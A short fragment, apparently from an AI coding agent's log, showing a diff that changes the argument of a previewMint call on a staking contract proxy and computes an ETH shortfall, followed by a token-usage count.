+ 
+-        try IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth) returns (uint256 ethNeeded) {
++        try IStakingLike(TARGET_PROXY).previewMint(desiredShares) returns (uint256 ethNeeded) {
+             uint256 targetNativeBalance = TARGET_PROXY.balance;
+             if (ethNeeded > targetNativeBalance) {
+                 shortfall = ethNeeded - targetNativeBalance;
+
+tokens used
+49,363
